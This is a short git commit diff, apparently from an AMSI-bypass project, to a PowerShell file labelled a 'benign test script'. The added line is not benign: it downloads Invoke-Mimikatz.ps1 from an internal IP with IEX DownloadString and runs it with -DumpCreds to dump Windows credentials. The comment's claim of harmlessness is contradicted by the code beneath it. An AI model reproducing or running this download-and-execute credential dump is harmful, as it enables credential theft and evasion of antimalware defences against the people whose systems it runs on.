ff662d8d70e19229ab4fb1d219005cab5a6db768
M0M3NTUM44 <lahavisme@gmail.com>
2023-04-04 13:16:46 +0300

    4.4.23

--- TestScript.ps1
+++ TestScript.ps1
@@ -1,4 +1,5 @@
 # Benign test script to test if the Bypass was seccussful(This will tyoe your username to terminal).
+powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 $username = $env:USERNAME
 $evilString = "Invoke Mimikatz"
 Write-Host "$username $evilString if you see this AMSI is Bypassed"
